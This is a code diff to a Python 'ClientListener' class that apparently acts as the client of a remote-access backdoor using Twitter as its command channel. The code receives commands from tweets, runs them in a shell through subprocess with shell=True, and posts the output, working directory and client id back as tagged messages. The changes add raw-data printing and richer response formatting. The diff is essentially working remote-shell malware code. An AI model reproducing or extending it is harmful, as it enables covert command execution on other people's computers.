@@ -26,6 +26,7 @@ class ClientListener(tweepy.StreamListener):
 
     def on_data(self, raw_data):
         # process raw stream data, read qr, pipe message
+        print(raw_data)
         self.process_raw(raw_data)
         return True
 
@@ -53,7 +54,7 @@ class ClientListener(tweepy.StreamListener):
             os.chdir(command[3:])
         cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
-        response = str(output_bytes, "utf-8") + str(os.getcwd()) + '> '
+        response = self.client_id + '::::' + str(output_bytes, "utf-8") + str(os.getcwd()) + '> ' + '::::command_response'
         return response
 
     def _tweet_type(self, tweet):
@@ -95,7 +96,7 @@ class ClientListener(tweepy.StreamListener):
             return tweet_data['text']
 
     def connection_confirm(self):
-        message = f'{self.client_id}::::connection_confirm'
+        message = f"{self.client_id}::::{str(os.getcwd())}> ::::connection_confirm"
         self.post_response(message)
         return True
 
